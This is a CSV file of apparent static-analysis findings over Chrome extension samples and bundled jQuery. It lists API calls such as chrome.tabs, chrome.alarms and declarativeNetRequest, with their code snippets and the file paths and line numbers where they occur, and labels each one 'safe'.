col0,col1,col2,col3,db_type,query_name,extracted_code_block
functional-samples/sample.dnr-rule-manager/manager.js,162,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,"chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [id], addRules: [ { id, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { [conditionType]: conditionValue, isUrlFilterCaseSensitive: caseSensitive, resourceTypes: ['main_frame', 'xmlhttprequest'] } } ] })"
functional-samples/sample.dnr-rule-manager/manager.js,187,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [id] })
functional-samples/sample.dnr-rule-manager/popup.js,2,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'manager.html' })
functional-samples/sample.dnr-rule-manager/popup.js,8,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
functional-samples/sample.dnr-rule-manager/popup.js,9,chrome.declarativeNetRequest.getMatchedRules,chrome. ... abId }),safe,chrome,chrome.declarativeNetRequest.getMatchedRules({ tabId })
functional-samples/sample.dnr-rule-manager/service_worker.js,3,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/service_worker.js,4,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... ]\r\n  }),safe,chrome,"chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: existingRules.map((rule) => rule.id), addRules: [ { id: 1, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { urlFilter: '|*?no-cookies=1', resourceTypes: ['main_frame', 'xmlhttprequest'] } }, { id: 2, action: { type: 'modifyHeaders', requestHeaders: [ { header: 'cookie', operation: 'remove' } ] }, condition: { regexFilter: '.*\\.google\\.com', resourceTypes: ['main_frame', 'xmlhttprequest'] } } ] })"
functional-samples/sample.dnr-rule-manager/service_worker.js,43,chrome.declarativeNetRequest.setExtensionActionOptions,chrome. ... rue\r\n}),safe,chrome,chrome.declarativeNetRequest.setExtensionActionOptions({ displayActionCountAsBadgeText: true })
functional-samples/sample.favicon-cs/content.js,2,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
functional-samples/sample.milestones/popup.js,15,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
functional-samples/sample.page-redder/service-worker.js,7,chrome.scripting.executeScript,chrome. ... \n    }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, function: reddenPage })"
functional-samples/sample.tabcapture-recorder/service-worker.js,16,chrome.runtime.getContexts,chrome. ... xts({}),safe,chrome,chrome.runtime.getContexts({})
functional-samples/sample.tabcapture-recorder/service-worker.js,36,chrome.runtime.sendMessage,chrome. ... \n    }),safe,chrome,"chrome.runtime.sendMessage({ type: 'stop-recording', target: 'offscreen' })"
functional-samples/sample.tabcapture-recorder/service-worker.js,50,chrome.runtime.sendMessage,chrome. ... d\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'start-recording', target: 'offscreen', data: streamId })"
functional-samples/sample.water_alarm_notification/background.js,8,chrome.notifications.create,chrome. ... 0\r\n  }),safe,chrome,"chrome.notifications.create({ type: 'basic', iconUrl: 'stay_hydrated.png', title: 'Time to Hydrate', message: ""Everyday I'm Guzzlin'!"", buttons: [{ title: 'Keep it Flowing.' }], priority: 0 })"
functional-samples/sample.water_alarm_notification/background.js,21,chrome.alarms.create,chrome. ... utes }),safe,chrome,chrome.alarms.create({ delayInMinutes: item.minutes })
functional-samples/sample.water_alarm_notification/popup.js,9,chrome.alarms.create,chrome. ... utes }),safe,chrome,chrome.alarms.create({ delayInMinutes: minutes })
functional-samples/sample.water_alarm_notification/popup.js,16,chrome.alarms.clearAll,chrome. ... arAll(),safe,chrome,chrome.alarms.clearAll()
functional-samples/sample.webgpu/service-worker.js,42,chrome.tabs.create,chrome. ... sult }),safe,chrome,chrome.tabs.create({ url: reader.result })
functional-samples/tutorial.broken-color/popup.js,27,chrome.tabs.query,chrome. ... ;\r\n  }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => { // Use the Scripting API to execute a script chrome.scripting.executeScript({ target: { tabId: tabs[0].id }, args: [color], func: setColor }); })"
functional-samples/tutorial.broken-color/popup.js,29,chrome.scripting.executeScript,chrome. ... \n    }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tabs[0].id }, args: [color], func: setColor })"
functional-samples/tutorial.custom-cursor/counter.js,2,chrome.runtime.sendMessage,chrome. ... click'),safe,chrome,chrome.runtime.sendMessage('page-click')
functional-samples/tutorial.focus-mode/background.js,40,chrome.scripting.insertCSS,chrome. ...      }),safe,chrome,"chrome.scripting.insertCSS({ files: ['focus-mode.css'], target: { tabId: tab.id } })"
functional-samples/tutorial.focus-mode/background.js,46,chrome.scripting.removeCSS,chrome. ...      }),safe,chrome,"chrome.scripting.removeCSS({ files: ['focus-mode.css'], target: { tabId: tab.id } })"
functional-samples/tutorial.focus-mode-debugging/background.js,39,chrome.tabs.sendMessage,chrome. ... -on' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-on' })"
functional-samples/tutorial.focus-mode-debugging/background.js,41,chrome.tabs.sendMessage,chrome. ... off' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-off' })"
functional-samples/tutorial.focus-mode-debugging/fixed/background.js,39,chrome.tabs.sendMessage,chrome. ... -on' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-on' })"
functional-samples/tutorial.focus-mode-debugging/fixed/background.js,41,chrome.tabs.sendMessage,chrome. ... off' }),safe,chrome,"chrome.tabs.sendMessage(tab.id, { data: 'focus-off' })"
functional-samples/tutorial.getting-started/popup.js,10,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
functional-samples/tutorial.getting-started/popup.js,12,chrome.scripting.executeScript,chrome. ... r\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, func: setPageBackgroundColor })"
functional-samples/tutorial.mole-game/controller/service-worker.js,4,chrome.alarms.create,chrome. ...  * 3 }),safe,chrome,chrome.alarms.create({ periodInMinutes: (1 / 60) * 3 })
functional-samples/tutorial.mole-game/controller/service-worker.js,8,chrome.management.getAll,chrome. ... etAll(),safe,chrome,chrome.management.getAll()
functional-samples/tutorial.mole-game/controller/service-worker.js,13,chrome.runtime.sendMessage,chrome. ... e.id }),safe,chrome,"chrome.runtime.sendMessage(moles[randomIndex].id, { id: chrome.runtime.id })"
functional-samples/tutorial.mole-game/mole/service-worker.js,8,chrome.runtime.sendMessage,chrome. ... ccess'),safe,chrome,"chrome.runtime.sendMessage(controllerId, 'success')"
functional-samples/tutorial.mole-game/mole/service-worker.js,30,chrome.tabs.query,chrome. ... ery({}),safe,chrome,chrome.tabs.query({})
functional-samples/tutorial.open-api-reference/content.js,6,chrome.runtime.sendMessage,chrome. ... tip' }),safe,chrome,chrome.runtime.sendMessage({ greeting: 'tip' })
functional-samples/tutorial.open-api-reference/sw-omnibox.js,27,chrome.tabs.create,chrome. ... nput }),safe,chrome,chrome.tabs.create({ url: URL_CHROME_EXTENSIONS_DOC + input })
functional-samples/tutorial.open-api-reference/sw-tips.js,14,chrome.alarms.create,chrome. ... 1440 }),safe,chrome,"chrome.alarms.create({ delayInMinutes: 1, periodInMinutes: 1440 })"
functional-samples/tutorial.quick-api-reference/content.js,6,chrome.runtime.sendMessage,chrome. ... tip' }),safe,chrome,chrome.runtime.sendMessage({ greeting: 'tip' })
functional-samples/tutorial.quick-api-reference/sw-omnibox.js,30,chrome.tabs.create,chrome. ... nput }),safe,chrome,chrome.tabs.create({ url: URL_CHROME_EXTENSIONS_DOC + input })
functional-samples/tutorial.quick-api-reference/sw-tips.js,16,chrome.alarms.get,chrome. ... M_NAME),safe,chrome,chrome.alarms.get(ALARM_NAME)
functional-samples/tutorial.quick-api-reference/sw-tips.js,18,chrome.alarms.create,chrome. ... \n    }),safe,chrome,"chrome.alarms.create(ALARM_NAME, { delayInMinutes: 1, periodInMinutes: 1440 })"
functional-samples/tutorial.tabs-manager/popup.js,15,chrome.tabs.query,chrome. ...   ]\r\n}),safe,chrome,"chrome.tabs.query({ url: [ 'https://developer.chrome.com/docs/webstore/*', 'https://developer.chrome.com/docs/extensions/*' ] })"
functional-samples/tutorial.tabs-manager/popup.js,38,chrome.tabs.update,chrome. ... true }),safe,chrome,"chrome.tabs.update(tab.id, { active: true })"
functional-samples/tutorial.tabs-manager/popup.js,50,chrome.tabs.group,chrome. ... bIds }),safe,chrome,chrome.tabs.group({ tabIds })
functional-samples/tutorial.terminate-sw/test-extension/page.js,5,chrome.runtime.sendMessage,chrome. ... 'ping'),safe,chrome,chrome.runtime.sendMessage('ping')
functional-samples/tutorial.terminate-sw/test-extension/service-worker-broken.js,4,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
functional-samples/tutorial.terminate-sw/test-extension/service-worker-fixed.js,2,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
functional-samples/sample.bookmarks/third-party/jquery-1.12.4.js,730,String.fromCharCode,String.fromCharCode argument: high + 0x10000,String. ... 10000 ),safe,others,String.fromCharCode( high + 0x10000 )
functional-samples/sample.bookmarks/third-party/jquery-1.12.4.js,732,String.fromCharCode,String.fromCharCode argument: high >> 10 | 0xD800,String. ... xDC00 ),safe,others,"String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 )"
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,7560,String.fromCharCode,String.fromCharCode argument: event.keyCode,String. ... yCode ),safe,others,String.fromCharCode( event.keyCode )
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,7578,String.fromCharCode,String.fromCharCode argument: event.keyCode,String. ... yCode ),safe,others,String.fromCharCode( event.keyCode )
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,10269,String.fromCharCode,String.fromCharCode argument: event.c ... harCode,String. ... rCode ),safe,others,String.fromCharCode( event.charCode == null ? event.keyCode : event.charCode )
